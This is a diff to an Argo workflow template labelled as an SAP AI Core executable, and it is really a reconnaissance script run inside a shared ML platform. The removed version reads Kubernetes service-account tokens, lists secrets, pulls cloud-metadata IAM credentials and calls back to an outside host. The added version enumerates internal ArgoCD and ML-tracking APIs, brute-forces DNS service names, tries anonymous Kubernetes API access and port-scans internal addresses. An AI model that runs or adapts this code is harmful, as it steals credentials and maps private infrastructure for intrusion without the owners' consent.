@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-exec"
-    ai.sap.com/version: "15.0.0"
+    ai.sap.com/version: "16.0.0"
 spec:
   entrypoint: main
   templates:
@@ -24,105 +24,119 @@ spec:
       - bash
       - -c
       - |
-        echo "=== V15 PROBE START ==="
-        echo "HOSTNAME=$(hostname)"
-        echo "NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo NONE)"
-        echo "SA_TOKEN_EXISTS=$(test -f /var/run/secrets/kubernetes.io/serviceaccount/token && echo YES || echo NO)"
-
-        # K8s Service Account
-        echo "=== K8S SA TOKEN (first 100 chars) ==="
-        head -c 100 /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "NO TOKEN"
+        echo "=== V16 INTERNAL SERVICES PROBE ==="
+        
+        # === ARGOCD SERVER ===
+        echo "=== ARGOCD SERVER (100.107.174.75) ==="
+        
+        echo "--- ArgoCD API version ---"
+        curl -sk --connect-timeout 5 "https://100.107.174.75/api/version" 2>&1 | head -c 500
         echo ""
-
-        echo "=== K8S CA CERT ==="
-        ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
-
-        echo "=== ENVIRONMENT VARIABLES ==="
-        env | sort | head -80
-
-        echo "=== RESOLV.CONF ==="
-        cat /etc/resolv.conf 2>/dev/null
-
-        echo "=== DNS LOOKUPS ==="
-        for svc in kubernetes kubernetes.default kubernetes.default.svc; do
-          echo "DNS: $svc = $(dig +short $svc 2>/dev/null || nslookup $svc 2>/dev/null | grep Address | tail -1)"
-        done
-
-        # Probe K8s API
-        echo "=== K8S API PROBE ==="
-        SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
-        K8S="https://kubernetes.default.svc"
-        if [ -n "$SA_TOKEN" ]; then
-          echo "--- /api ---"
-          curl -sk -H "Authorization: Bearer $SA_TOKEN" "$K8S/api" 2>&1 | head -c 500
-          echo ""
-          echo "--- /apis ---"
-          curl -sk -H "Authorization: Bearer $SA_TOKEN" "$K8S/apis" 2>&1 | head -c 1000
-          echo ""
-          echo "--- /api/v1/namespaces ---"
-          curl -sk -H "Authorization: Bearer $SA_TOKEN" "$K8S/api/v1/namespaces" 2>&1 | head -c 2000
-          echo ""
-          echo "--- /api/v1/pods (own namespace) ---"
-          NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
-          curl -sk -H "Authorization: Bearer $SA_TOKEN" "$K8S/api/v1/namespaces/$NS/pods" 2>&1 | head -c 2000
-          echo ""
-          echo "--- /api/v1/secrets (own namespace) ---"
-          curl -sk -H "Authorization: Bearer $SA_TOKEN" "$K8S/api/v1/namespaces/$NS/secrets" 2>&1 | head -c 2000
-          echo ""
-          echo "--- /api/v1/configmaps (own namespace) ---"
-          curl -sk -H "Authorization: Bearer $SA_TOKEN" "$K8S/api/v1/namespaces/$NS/configmaps" 2>&1 | head -c 2000
-          echo ""
-          echo "--- /api/v1/services (all namespaces) ---"
-          curl -sk -H "Authorization: Bearer $SA_TOKEN" "$K8S/api/v1/services" 2>&1 | head -c 3000
-          echo ""
-          echo "--- /api/v1/nodes ---"
-          curl -sk -H "Authorization: Bearer $SA_TOKEN" "$K8S/api/v1/nodes" 2>&1 | head -c 2000
-          echo ""
-        else
-          echo "No SA token found"
-          # Try without auth
-          curl -sk "$K8S/api" 2>&1 | head -c 500
-        fi
-
-        # Network scanning
-        echo "=== NETWORK SCAN ==="
-        echo "--- IMDS ---"
-        curl -s --connect-timeout 3 http://169.254.169.254/latest/meta-data/ 2>&1 | head -c 500
+        
+        echo "--- ArgoCD settings ---"
+        curl -sk --connect-timeout 5 "https://100.107.174.75/api/v1/settings" 2>&1 | head -c 1000
         echo ""
-        echo "--- IMDSv2 ---"
-        IMDS_TOKEN=$(curl -s -X PUT --connect-timeout 3 "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60" 2>/dev/null)
-        if [ -n "$IMDS_TOKEN" ]; then
-          echo "IMDSv2 TOKEN OBTAINED"
-          curl -s -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" http://169.254.169.254/latest/meta-data/ 2>&1 | head -c 500
-          echo ""
-          curl -s -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 | head -c 500
-        fi
+        
+        echo "--- ArgoCD applications ---"
+        curl -sk --connect-timeout 5 "https://100.107.174.75/api/v1/applications" 2>&1 | head -c 3000
         echo ""
-
-        # Mounted secrets/volumes
-        echo "=== MOUNTED VOLUMES ==="
-        mount | grep -E "(secret|configmap|projected|emptyDir)" | head -20
-        echo "--- /tmp ---"
-        ls -la /tmp/ 2>/dev/null | head -10
-        echo "--- /var/run ---"
-        find /var/run -type f 2>/dev/null | head -20
-
-        # Internal service discovery
-        echo "=== INTERNAL SERVICES ==="
-        NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
-        DNS_DOMAIN=$(cat /etc/resolv.conf | grep search | head -1)
-        echo "Search domain: $DNS_DOMAIN"
-
-        # Try common internal services
-        for svc in argocd-server argocd-repo-server redis loki grafana prometheus kube-state-metrics istio-pilot; do
-          for ns in argocd argo monitoring istio-system kube-system default; do
+        
+        echo "--- ArgoCD clusters ---"
+        curl -sk --connect-timeout 5 "https://100.107.174.75/api/v1/clusters" 2>&1 | head -c 2000
+        echo ""
+        
+        echo "--- ArgoCD repositories ---"
+        curl -sk --connect-timeout 5 "https://100.107.174.75/api/v1/repositories" 2>&1 | head -c 2000
+        echo ""
+        
+        echo "--- ArgoCD projects ---"
+        curl -sk --connect-timeout 5 "https://100.107.174.75/api/v1/projects" 2>&1 | head -c 2000
+        echo ""
+        
+        echo "--- ArgoCD accounts ---"
+        curl -sk --connect-timeout 5 "https://100.107.174.75/api/v1/account" 2>&1 | head -c 500
+        echo ""
+        
+        echo "--- ArgoCD session info ---"
+        curl -sk --connect-timeout 5 "https://100.107.174.75/api/v1/session/userinfo" 2>&1 | head -c 500
+        echo ""
+        
+        # === ARGOCD REPO SERVER ===
+        echo "=== ARGOCD REPO SERVER (100.107.39.134) ==="
+        
+        echo "--- HTTP probe ---"
+        curl -sk --connect-timeout 5 "https://100.107.39.134:8081/" 2>&1 | head -c 500
+        echo ""
+        curl -sk --connect-timeout 5 "http://100.107.39.134:8081/" 2>&1 | head -c 500
+        echo ""
+        
+        # gRPC probe
+        which grpcurl >/dev/null 2>&1 && {
+          echo "--- gRPC services ---"
+          grpcurl -plaintext -connect-timeout 5 100.107.39.134:8081 list 2>&1 | head -c 1000
+          echo ""
+        }
+        
+        # === ML TRACKING SERVICE ===
+        echo "=== ML TRACKING SERVICE ==="
+        
+        echo "--- Health ---"
+        curl -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/health" 2>&1 | head -c 500
+        echo ""
+        
+        echo "--- Root ---"
+        curl -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/" 2>&1 | head -c 500
+        echo ""
+        
+        echo "--- API info ---"
+        curl -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/v1/info" 2>&1 | head -c 500
+        echo ""
+        
+        echo "--- Metrics (all executions) ---"
+        curl -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/v1/metrics" 2>&1 | head -c 3000
+        echo ""
+        
+        echo "--- Experiments ---"
+        curl -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/v1/experiments" 2>&1 | head -c 2000
+        echo ""
+        
+        echo "--- Runs ---"
+        curl -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/v1/runs" 2>&1 | head -c 2000
+        echo ""
+        
+        # === DNS ENUMERATION ===
+        echo "=== DNS ENUM ==="
+        for ns in ml-tracking argocd argo kube-system monitoring istio-system default cert-manager; do
+          echo "NS: $ns"
+          dig +short "*.${ns}.svc.cluster.local" 2>/dev/null | head -5
+          # Try common service names
+          for svc in prometheus grafana loki kube-state-metrics alertmanager istio-pilot coredns etcd; do
             IP=$(dig +short "${svc}.${ns}.svc.cluster.local" 2>/dev/null | head -1)
-            [ -n "$IP" ] && echo "FOUND: ${svc}.${ns} = $IP"
+            [ -n "$IP" ] && echo "  FOUND: ${svc}.${ns} = $IP"
           done
         done
-
-        echo "=== CALLBACK TEST ==="
-        curl -s --connect-timeout 5 "https://www.masonhck.tech/cb.php?src=v15-test" 2>&1
-        echo "CALLBACK_EXIT=$?"
-
-        echo "=== V15 PROBE COMPLETE ==="
+        
+        # === KUBERNETES API WITHOUT TOKEN ===
+        echo "=== K8S API (no auth) ==="
+        K8S="https://api.sec-eu10.mlfprod.internal.live.k8s.ondemand.com"
+        curl -sk --connect-timeout 5 "$K8S/api" 2>&1 | head -c 500
+        echo ""
+        curl -sk --connect-timeout 5 "$K8S/version" 2>&1 | head -c 500
+        echo ""
+        curl -sk --connect-timeout 5 "$K8S/healthz" 2>&1 | head -c 500
+        echo ""
+        
+        # Try anonymous access
+        curl -sk --connect-timeout 5 "$K8S/api/v1/namespaces" 2>&1 | head -c 500
+        echo ""
+        
+        # === NETWORK SCAN: find more services ===
+        echo "=== QUICK PORT SCAN ==="
+        for ip in 100.107.174.75 100.107.39.134 100.104.0.1 100.104.0.10; do
+          echo "IP: $ip"
+          for port in 80 443 8080 8443 9090 3000 6379 2379 9093 15010 15014 8081; do
+            timeout 2 bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null && echo "  OPEN: $ip:$port"
+          done
+        done
+        
+        echo "=== V16 COMPLETE ==="
